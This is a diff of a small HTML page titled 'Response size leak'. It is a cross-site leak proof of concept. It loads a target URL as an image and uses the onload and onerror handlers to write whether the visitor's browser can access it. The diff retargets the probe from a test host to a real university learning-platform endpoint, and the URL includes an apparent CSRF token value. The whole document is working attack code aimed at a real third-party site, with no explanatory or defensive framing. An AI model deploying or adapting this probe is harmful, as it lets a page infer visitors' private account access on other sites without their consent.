@@ -2,28 +2,29 @@
   <title>Response size leak</title>
   <script>
     
-    async function get_diff(url) {
+    async function get(url) {
       let element = document.createElement('img');
       element.src = url;
 
       return new Promise((resolve) => {
         element.onload = () => {
-          console.log(`${url} exists`);
+          console.log(`Accesible: ${url}`);
+          document.body.innerHTML += `Accesible: ${url}`
         }
         element.onerror = () => {
-          console.log(`${url} does not exist`);
+          console.log(`Inaccessible: ${url}`);
+          document.body.innerHTML += `Inaccessible: ${url}`
         }
       });
 
     }
 
     async function run(url) {
-      get_diff(url + 'exists');
-      get_diff(url + 'does_not_exist');
+
     }
     
     onload = () => {
-      run('http://ibgang.com:8880/');
+      get('https://learn.tsinghua.edu.cn/b/wlxt/kc/v_kcxx_jskcxx/teacher/showImageById?wlkcid=2021-2022-3145068127&_csrf=762bfdbe-e4f6-43dd-bf64-70ff6666738a');
     }
   </script>
 </head>
